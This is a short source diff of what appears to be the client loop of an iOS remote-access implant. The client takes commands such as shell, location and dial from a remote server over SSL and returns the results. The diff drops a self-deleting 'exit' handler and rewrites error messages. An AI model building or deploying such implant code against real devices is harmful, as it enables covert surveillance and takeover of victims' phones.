@@ -27,7 +27,6 @@
 NSArray *commands = [[NSArray alloc] initWithObjects: @"alert", @"battery", @"dial", @"dhome", @"getvol", @"home", @"location", @"player", @"say", @"setvol", @"shell", @"state", @"sysinfo", @"openurl", @"openapp", nil];
 
 int sockfd, newsockfd;
-NSString *executable;
 SSL_CTX *ssl_client_ctx;
 SSL *client_ssl;
 struct sockaddr_in serverAddress;
@@ -71,14 +70,11 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
         if ([commands containsObject:args[0]]) {
             NSString *result = [membrane_base sendCommand:args];
             if (result) {
-                if (![result isEqualToString:@""])
-                    sendString(result);
+                sendString(result);
                 SSL_write(client_ssl, [terminator UTF8String], (int)terminator.length);
-            } else sendString(@"-2"); // dyld is not patched
-        } else if ([args[0] isEqualToString:@"exit"]) {
-            remove(executable);
+            } else sendString(@"dyld is not patched");
         } else {
-            sendString(@"-1"); // unrecognized command
+            sendString(@"unrecognized command");
             SSL_write(client_ssl, [terminator UTF8String], (int)terminator.length);
         }
         memset(buffer, '\0', 2048);
